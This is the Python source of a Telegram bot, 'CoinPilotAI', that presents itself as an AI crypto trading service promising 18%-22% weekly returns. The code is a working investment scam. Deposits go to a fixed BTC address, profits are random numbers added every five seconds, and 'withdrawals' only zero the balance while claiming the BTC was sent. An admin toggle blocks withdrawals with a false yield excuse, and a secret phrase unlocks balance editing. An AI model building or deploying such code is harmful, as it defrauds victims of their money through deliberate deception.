import os
import json
import asyncio
import random
from datetime import datetime
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
import nest_asyncio

nest_asyncio.apply()

# ----------------------------
# Data & Configuration
# ----------------------------
running_bots = set()
user_strategies = {}
STRATEGIES = ["LPDNY", "Cross-DEX VA", "Mean Reversion", "Shill Hunter"]
BOT_TOKEN = os.getenv("BOT_TOKEN")
DATA_FILE = "data.json"
SECRET_PHRASE = "NewMexicoMouse"
DEFAULT_ADMIN_ID = 6064485557

# Tracks pending actions
pending_withdrawal = {}
pending_edit = {}
pending_inject = {}
pending_affiliate = {}  # <-- NEW
admin_mode = {}
withdraw_blocker = {}  # New: user_id -> True/False
started_users = {}  # Tracks users who clicked start

# ----------------------------
# Load/Save Data
# ----------------------------
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
    with open(DATA_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

data = load_data()

# ----------------------------
# Helpers
# ----------------------------
def get_balance(uid):
    return data['users'].get(str(uid), {}).get("balance", 0.0)

def get_profit(uid):
    return data['users'].get(str(uid), {}).get("profit", 0.0)

def set_balance(uid, amount):
    uid = str(uid)
    data['users'].setdefault(uid, {})['balance'] = amount
    save_data()

def add_profit(uid, amount):
    uid = str(uid)
    data['users'].setdefault(uid, {})['profit'] = data['users'][uid].get("profit", 0.0) + amount
    save_data()

def log_action(uid, action, details=None):
    data.setdefault("activity_log", []).append({
        "timestamp": datetime.utcnow().isoformat(),
        "user_id": uid,
        "action": action,
        "details": details or {}
    })
    save_data()

def is_admin(uid):
    return uid in data.get("admins", [])

# ----------------------------
# UI Menus
# ----------------------------
def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Balance", callback_data="balance")],
        [InlineKeyboardButton("Deposit", callback_data="deposit"), InlineKeyboardButton("Withdrawal", callback_data="withdrawal")],
        [InlineKeyboardButton("▶️ Run", callback_data="run"), InlineKeyboardButton("⏹ Stop", callback_data="stop")],
        [InlineKeyboardButton("Strategy", callback_data="strategy")],
        [InlineKeyboardButton("Affiliates", callback_data="affiliates")],  # <-- NEW
        [InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("🚪 Exit", callback_data="exit")]
    ])

def get_admin_menu():
    # Add log of users who clicked start
    user_log_buttons = [
        [InlineKeyboardButton(f"{uid}: {started_users.get(uid,'Unknown')}", callback_data="noop")]
        for uid in started_users
    ]
    toggle_buttons = [
        [InlineKeyboardButton("Enable Withdraw Blocker", callback_data="blocker_on"),
         InlineKeyboardButton("Disable Withdraw Blocker", callback_data="blocker_off")]
    ]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("Inject to Self", callback_data="inject_self"),
         InlineKeyboardButton("Edit User", callback_data="edit_user")],
        [InlineKeyboardButton("📄 Activity Log", callback_data="view_log")],
        *user_log_buttons,
        *toggle_buttons,
        [InlineKeyboardButton("❌ Close Admin Panel", callback_data="close_admin")],
        [InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")]
    ])

def get_withdrawal_confirmation(uid, addr, net, fee):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Yes, send {net:.8f} BTC", callback_data=f"confirm_withdraw:{addr}:{net}:{fee}"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_withdraw")]
    ])

def get_back_main_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")]])

# ----------------------------
# Affiliates Menu
# ----------------------------
def get_affiliate_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Redeem Code", callback_data="redeem_code")],
        [InlineKeyboardButton("Make a Code", callback_data="make_code")],
        [InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")]
    ])

# ----------------------------
# Handlers
# ----------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    data['users'].setdefault(str(uid), {"balance": 0.0, "profit": 0.0})
    save_data()
    started_users[uid] = username
    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data['users'].setdefault(str(uid), {"balance": 0.0, "profit": 0.0})
    balance = get_balance(uid)
    profit = get_profit(uid)
    cmd = query.data

    if cmd == "back_main":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_menu())
        return

    if cmd == "balance":
        await query.edit_message_text(f"*Balance:* {balance:.8f} BTC", reply_markup=get_back_main_button(), parse_mode="Markdown")

    elif cmd == "deposit":
        await query.edit_message_text(
            "Your unique account wallet (click to copy)\n\n`bc1q02dcj7722y8gawmlphstaaz3l2kyhzursn0sjh`\n\n*(Minimum 0.00095 BTC)*",
            parse_mode="Markdown",
            reply_markup=get_back_main_button()
        )

    elif cmd == "withdrawal":
        if withdraw_blocker.get(uid, False):
            await query.edit_message_text("❌ Funds are currently being deployed across liquidity pools for optimal yield. Withdrawals are temporarily disabled for 48-72 hours to prevent arbitrage exploits and ensure maximum APY for all users.", reply_markup=get_back_main_button())
        elif balance <= 0:
            await query.edit_message_text("❌ You have no balance.", reply_markup=get_back_main_button())
        else:
            await query.edit_message_text("Enter withdrawal address:", reply_markup=None)
            pending_withdrawal[uid] = {"step": 1, "amount": balance}
            log_action(uid, "Started Withdrawal")

    elif cmd.startswith("confirm_withdraw:"):
        _, addr, net, fee = cmd.split(":")
        net, fee = float(net), float(fee)
        set_balance(uid, 0.0)
        data['users'][str(uid)]['profit'] = 0.0
        log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(13% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())

    elif cmd == "cancel_withdraw":
        pending_withdrawal.pop(uid, None)
        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_back_main_button())

    elif cmd == "run":
        if balance <= 0:
            await query.edit_message_text("❌ You cannot run the bot because you have no balance.", reply_markup=get_back_main_button())
        else:
            running_bots.add(uid)
            await query.edit_message_text("✅ Bot started.", reply_markup=get_back_main_button())
            log_action(uid, "Started Bot")

    elif cmd == "stop":
        running_bots.discard(uid)
        await query.edit_message_text("Bot Stopped.", reply_markup=get_back_main_button())
        log_action(uid, "Stopped Bot")

    elif cmd == "monitor":
        strategy = user_strategies.get(uid, "None")
        pct = (profit / (balance - profit) * 100) if balance - profit > 0 else 0.0
        await query.edit_message_text(
            f"*Balance:* {balance:.8f} BTC\n*Profit:* {profit:.8f} BTC (+{pct:.2f}%)\n*Strategy:* {strategy}",
            reply_markup=get_back_main_button(),
            parse_mode="Markdown"
        )

    elif cmd == "strategy":
        buttons = [[InlineKeyboardButton(s, callback_data=f"select_strategy:{s}")] for s in STRATEGIES]
        buttons.append([InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")])
        await query.edit_message_text("Choose a strategy:", reply_markup=InlineKeyboardMarkup(buttons))

    elif cmd.startswith("select_strategy:"):
        selected = cmd.split(":", 1)[1]
        user_strategies[uid] = selected
        await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_back_main_button())

    elif cmd == "help":
        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    CoinPilotAI is a Grok powered trading bot that promises 18%-22% weekly profits. This is by far, the easiest way to start your decentralized finance journey. It's very simple to begin, start by depositing Bitcoin into your account. You can find your account details with the deposit button. Once your funds are processed, you can pick a trading strategy and start the bot right away! The bot will begin using your account funds to make small term investments at rapid rates, with precision. The team behind CoinPilotAI receives a 13% cut of every withdrawal on the platform to keep things running. \n\nGood Luck! ", reply_markup=get_back_main_button(), parse_mode="Markdown")

    elif cmd == "exit":
        await query.edit_message_text("Goodbye!")

    # ----------------------------
    # Affiliates Menu Handlers
    # ----------------------------
    elif cmd == "affiliates":
        await query.edit_message_text("Affiliate Menu:", reply_markup=get_affiliate_menu())

    elif cmd == "redeem_code":
        pending_affiliate[uid] = "redeem"
        await query.edit_message_text("Enter your affiliate code:", reply_markup=get_back_main_button())

    elif cmd == "make_code":
        await query.edit_message_text("You cannot make a code yet. Your CoinPilot account must be at least 7 days old, and have 1 deposit on record.", reply_markup=get_back_main_button())

    elif cmd.startswith("blocker_"):
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            for user_id in started_users:
                if cmd == "blocker_on":
                    withdraw_blocker[user_id] = True
                else:
                    withdraw_blocker[user_id] = False
            await query.edit_message_text(f"Withdraw blocker {'enabled' if cmd=='blocker_on' else 'disabled'} for all users.", reply_markup=get_admin_menu())

    elif cmd == "inject_self":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            pending_inject[uid] = True
            await query.edit_message_text("💵 Enter amount to inject:")

    elif cmd == "edit_user":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            pending_edit[uid] = {"step": 1}
            await query.edit_message_text("Send user Telegram ID:")

    elif cmd == "add_admin":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            pending_edit[uid] = {"admin_add": True}
            await query.edit_message_text("Send user ID to add as admin:")

    elif cmd == "remove_admin":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            pending_edit[uid] = {"admin_remove": True}
            await query.edit_message_text("Send user ID to remove from admins:")

    elif cmd == "view_log":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_back_main_button())
        else:
            logs = data.get("activity_log", [])[-10:]
            log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - User:{log['user_id']}" for log in logs]) or "No logs."
            await query.edit_message_text(f"\U0001F4D3 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())

    elif cmd == "close_admin":
        admin_mode[uid] = False
        await query.edit_message_text("Admin panel closed.", reply_markup=get_back_main_button())

    else:
        await query.edit_message_text("Unknown command.", reply_markup=get_back_main_button())

# ----------------------------
# Messages
# ----------------------------
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message.text.strip()

    if msg == SECRET_PHRASE:
        admin_mode[uid] = not admin_mode.get(uid, False)
        if admin_mode[uid]:
            await update.message.reply_text("Admin Panel Enabled", reply_markup=get_admin_menu())
            log_action(uid, "Admin Panel Enabled")
        else:
            await update.message.reply_text("Admin Panel Disabled")
            log_action(uid, "Admin Panel Disabled")
        return

    # ----------------------------
    # Affiliate Code Redemption
    # ----------------------------
    if uid in pending_affiliate and pending_affiliate[uid] == "redeem":
        if msg == "G7HA2N":
            await update.message.reply_text("Code Redeemed ✅ On your next withdrawal, your transaction fee will be lowered from 13%, down to 4%.", reply_markup=get_affiliate_menu())
        else:
            await update.message.reply_text("Invalid Code ❌", reply_markup=get_affiliate_menu())
        pending_affiliate.pop(uid)
        return

    # Withdrawal flow
    if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
        addr = msg
        bal = pending_withdrawal[uid]["amount"]
        fee = bal * 0.05
        net = bal - fee
        pending_withdrawal.pop(uid, None)
        await update.message.reply_text(
            f"Confirm sending {net:.8f} BTC (5% fee) to `{addr}`:", parse_mode="Markdown",
            reply_markup=get_withdrawal_confirmation(uid, addr, net, fee)
        )
        return

    # Edit flows
    if uid in pending_edit:
        step = pending_edit[uid]
        try:
            if "step" in step and step["step"] == 1:
                target_id = int(msg)
                pending_edit[uid] = {"step": 2, "target": target_id}
                await update.message.reply_text("Now enter the new BTC amount:")
            elif "step" in step and step["step"] == 2:
                amt = float(msg)
                target = step["target"]
                set_balance(target, amt)
                log_action(uid, "Edited User Balance", {"target": target, "amount": amt})
                pending_edit.pop(uid)
                await update.message.reply_text(f"Set user {target}'s balance to {amt:.8f} BTC")
            elif "admin_add" in step:
                aid = int(msg)
                if aid not in data['admins']:
                    data['admins'].append(aid)
                    save_data()
                    log_action(uid, "Added Admin", {"added": aid})
                    await update.message.reply_text("Admin added.")
                else:
                    await update.message.reply_text("User already admin.")
                pending_edit.pop(uid)
            elif "admin_remove" in step:
                rid = int(msg)
                if rid in data['admins']:
                    data['admins'].remove(rid)
                    save_data()
                    log_action(uid, "Removed Admin", {"removed": rid})
                    await update.message.reply_text("Admin removed.")
                else:
                    await update.message.reply_text("User not an admin.")
                pending_edit.pop(uid)
            else:
                pending_edit.pop(uid)
                await update.message.reply_text("Unknown edit step. Reset.")
        except:
            await update.message.reply_text("Invalid input. Try again.")
        return

# ----------------------------
# Profit Loop
# ----------------------------
strategy_ranges = {
    "Diamond Hands": (0.00000000, 0.0000001),
    "Rocket Sniper": (0.00000000, 0.0000001),
    "FOMO Frenzy": (0.0000001, 0.0000002),
    "Shill Hunter": (0.0000001, 0.0000003)
}

async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
    for uid in running_bots:
        try:
            current_bal = get_balance(uid)
            strategy = user_strategies.get(uid, "Diamond Hands")
            low, high = strategy_ranges.get(strategy, (0.00000001, 0.0000002))
            gain = random.uniform(low, high)
            set_balance(uid, current_bal + gain)
            add_profit(uid, gain)
        except:
            continue

# ----------------------------
# Webserver
# ----------------------------
async def handle(request):
    return web.Response(text="OK")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    while True:
        await asyncio.sleep(3600)

# ----------------------------
# Bot Startup
# ----------------------------
async def start_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.job_queue.run_repeating(profit_loop, interval=5)
    app.create_task(run_webserver())
    await app.run_polling()

if __name__ == "__main__":
    import asyncio
    import nest_asyncio
    nest_asyncio.apply()  # already in your code
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_bot())
